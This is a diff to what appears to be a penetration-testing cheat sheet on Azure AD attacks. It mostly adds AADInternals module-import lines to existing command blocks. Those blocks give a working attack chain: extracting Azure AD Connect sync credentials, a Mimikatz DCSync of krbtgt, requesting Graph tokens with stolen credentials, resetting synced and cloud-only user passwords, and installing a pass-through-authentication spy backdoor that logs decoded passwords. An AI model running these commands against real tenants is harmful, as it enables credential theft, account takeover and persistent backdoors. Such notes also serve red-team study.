@@ -148,6 +148,7 @@ Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
 
 #### Extract credentials from the server
 ```
+Import-Module .\AADInternals.psd1
 Get-AADIntSyncCredentials
 ```
 
@@ -162,6 +163,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN>
 
 #### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
 ```
+Import-Module .\AADInternals.psd1
 $passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
 Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
@@ -183,9 +185,10 @@ Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Ve
 ```
 
 #### Reset password for cloud only user
-- Need CloudAnchor ID which is the format <USER>_<OBJECTID>
+- Need CloudAnchor ID which is the format ```<USER>_<OBJECTID>```
 ```
-Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
+Import-Module .\AADInternals.psd1
+ Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
 Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 ```
 
@@ -198,6 +201,7 @@ Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 
 #### Install a backdoor (needs to be run ad administrator)
 ```
+Import-Module .\AADInternals.psd1
 Install-AADIntPTASpy
 ```
 
@@ -210,6 +214,7 @@ Get-AADIntPTASpyLog -DecodePasswords
 #### Register a new PTA agent
 - After getting Global Administrator privileges by setting it on a attacker controled machine.
 ```
+Import-Module .\AADInternals.psd1
 Install-AADIntPTASpy
 ```
 
